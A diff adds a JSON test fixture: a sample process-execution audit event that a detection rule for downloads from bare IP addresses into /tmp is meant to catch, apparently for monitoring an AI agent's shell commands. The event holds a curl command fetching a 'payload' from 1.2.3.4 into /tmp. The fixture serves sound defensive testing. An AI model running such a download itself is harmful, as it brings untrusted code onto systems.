@@ -1,0 +1,10 @@
+{
+  "_comment": "Sample normalised execve event (Laurel-style) that MUST fire download_ip_to_tmp. This is the real drill we ran by hand: curl an IP literal into /tmp. Zircolite maps process_creation Image->the exe, CommandLine->the joined argv; the field names here follow that mapping.",
+  "EventID": "1",
+  "Image": "/run/current-system/sw/bin/curl",
+  "CommandLine": "curl -sS -m 5 http://1.2.3.4/payload -o /tmp/payload",
+  "User": "claude",
+  "CurrentDirectory": "/home/claude",
+  "ParentImage": "/run/current-system/sw/bin/bash",
+  "key": "agent-claude-exec"
+}
